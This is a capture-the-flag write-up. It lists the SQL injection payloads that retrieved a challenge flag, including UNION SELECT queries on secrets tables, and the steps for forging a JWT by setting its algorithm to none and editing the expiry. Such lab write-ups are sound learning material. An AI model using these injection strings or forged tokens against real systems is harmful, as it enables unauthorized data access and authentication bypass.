## Flag:
```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Approach:
Used various queries out of which mentioned below worked:
- ```  ' OR '1'='1' --  ```
- ```  ' OR department='Management' --  ```
- ```  Kiwi' AND department='Management' --  ```
- ```  ' UNION SELECT * FROM metadata --  ```
- ```  ' UNION SELECT secrets, NULL, NULL, NULL FROM CITADEL_ARCHIVE_2077 --  ```


## Concepts Learned:
- Got to learn about sql injection queries, extracting data from tables.

## Wrong Tangents:
- Tried several wrong queries and blindly performing injections.

## Approach:
- Opened Developer's Tool, looked for it's cookie-token.
- Opened ``` jwt.io ``` website, pasted it in the website, got Header, Payloads and Signature shown below.
- It was a ``` Symmetric key ``` algorithm.
- Changed alg to ``` none ```, removed the signature part.

- Modified ``` exp : 0 ``` to ``` exp : 1767193756 ``` to make it unexpired.
- Used ``` Epoch Time Converter ``` to get exp Timestrap.

- Encoded it using Base64 and put the token value in the token in Develops tools.
- Got the Flag after refreshing the page.
